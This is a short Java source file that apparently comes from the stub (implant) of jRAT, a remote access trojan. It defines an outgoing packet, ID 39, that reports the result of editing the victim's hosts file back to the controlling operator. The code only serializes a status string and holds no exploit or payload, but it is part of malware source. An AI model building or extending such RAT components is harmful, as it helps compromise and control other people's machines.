package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet39HostEditResult extends AbstractOutgoingPacket {

	private String status;

	public Packet39HostEditResult(String status) {
		this.status = status;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(status);
	}

	@Override
	public short getPacketId() {
		return 39;
	}

}
